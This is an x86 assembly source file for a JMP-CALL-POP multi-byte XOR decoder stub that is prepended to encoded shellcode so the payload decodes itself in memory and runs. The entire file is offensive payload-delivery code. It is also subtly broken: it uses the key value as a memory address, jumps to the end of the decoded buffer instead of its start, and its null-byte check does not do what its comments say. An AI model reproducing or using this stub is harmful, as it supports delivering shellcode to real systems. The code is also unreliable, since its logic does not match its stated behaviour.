; Advanced JMP-CALL-POP Multi-byte XOR decoder stub
; This stub will be prepended to the encoded shellcode.
; The XOR key (4 bytes) and encoded shellcode length (4 bytes) will immediately follow the 'call decoder' instruction.

BITS 32

%define NULL_FREE_LENGTH_XOR_KEY 0x5A5A5A5A  ; Changed to ensure no null bytes in the key itself

_start:
    jmp short call_decoder

decoder:
    pop esi                     ; ESI = address of XOR key and encoded length
    mov ebx, [esi]             ; Load 4-byte key into EBX (using no prefixes)
    mov ecx, [esi+4]           ; Load encoded shellcode length into ECX
    xor ecx, NULL_FREE_LENGTH_XOR_KEY ; Decode actual length

    ; Check for null bytes in key and adjust if necessary
    test ebx, ebx              ; Check if any nulls in key
    jz adjust_key              ; If nulls found, use alternative decode
    
    ; Standard decode approach
    add esi, 8                 ; ESI = start of actual encoded shellcode
    cdq                        ; Zero EDX (using CDQ instead of XOR EDX,EDX to avoid bytes)
decode_loop:
    mov al, [esi]              ; Load byte to decode
    xor al, [ebx+edx]          ; XOR with key byte (simplified)
    mov [esi], al              ; Store decoded byte back
    inc esi                    ; Move to next shellcode byte
    inc edx                    ; Increment key byte counter
    and edx, 0x03              ; EDX = EDX % 4 (to cycle through 4-byte key)
    dec ecx                    ; Decrement shellcode length counter
    jnz decode_loop            ; Loop until all bytes are decoded
    jmp esi                    ; Jump to decoded shellcode

adjust_key:
    ; Use a different approach if key contains nulls
    mov eax, 0x41414141       ; Load safe key without nulls
    add esi, 8                ; ESI = start of actual encoded shellcode
    xor edx, edx              ; Zero EDX using XOR instead of CDQ
decode_loop_alt:
    mov al, [esi]             ; Load byte to decode
    xor al, [eax+edx]         ; XOR with key byte (alternative)
    mov [esi], al             ; Store decoded byte back
    inc esi                   ; Move to next shellcode byte
    inc edx                   ; Increment key byte counter
    and edx, 0x03             ; EDX = EDX % 4 (to cycle through 4-byte key)
    dec ecx                   ; Decrement shellcode length counter
    jnz decode_loop_alt       ; Loop until all bytes are decoded
    jmp esi                   ; Jump to decoded shellcode

call_decoder:
    call decoder
    ; Encoded shellcode follows here